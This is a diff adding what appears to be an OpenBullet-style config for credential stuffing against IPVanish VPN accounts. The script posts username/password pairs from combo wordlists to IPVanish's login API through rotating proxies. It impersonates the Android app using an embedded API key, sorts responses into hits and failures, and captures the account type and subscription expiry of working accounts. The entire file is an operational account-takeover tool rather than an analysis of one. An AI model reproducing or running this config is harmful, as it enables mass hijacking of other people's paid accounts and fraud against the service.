@@ -1,0 +1,87 @@
+[SETTINGS]
+{
+  "Name": "IPVANISH_VPN API Damon",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-03-26T20:23:32.2569269+05:00",
+  "AdditionalInfo": " ",
+  "Author": "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.ipvanish.com/api/v3/login" 
+  CONTENT "{\"api_key\":\"15cb936e6d19cd7db1d6f94b96017541\",\"client\":\"Android-3.4.6.2.94412b94412\",\"os\":\"25\",\"password\":\"<PASS>\",\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/json;charset=utf-8" 
+  HEADER "Host: api.ipvanish.com" 
+  HEADER "x-client: ipvanish" 
+  HEADER "x-client-version: 1.2." 
+  HEADER "x-platform: Android" 
+  HEADER "x-platform-version: 25" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "user-agent: okhttp/4.4.0" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The username or password provided is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "\"email\"" 
+
+PARSE "<SOURCE>" JSON "account_type" CreateEmpty=FALSE -> CAP "Account Type" 
+
+PARSE "<SOURCE>" JSON "sub_end_epoch" -> VAR "End" 
+
+FUNCTION UnixTimeToDate "dd-MM-yyyy" 
+
+FUNCTION CurrentUnixTime -> VAR "UNIX" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<End>" LessThan "<UNIX>" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<End>" EqualTo "<UNIX>" 
+  KEYCHAIN Success OR 
+    KEY "<End>" GreaterThan "<UNIX>" 
+
+#Credits FUNCTION Constant "Damon" -> CAP "Config By" 
+
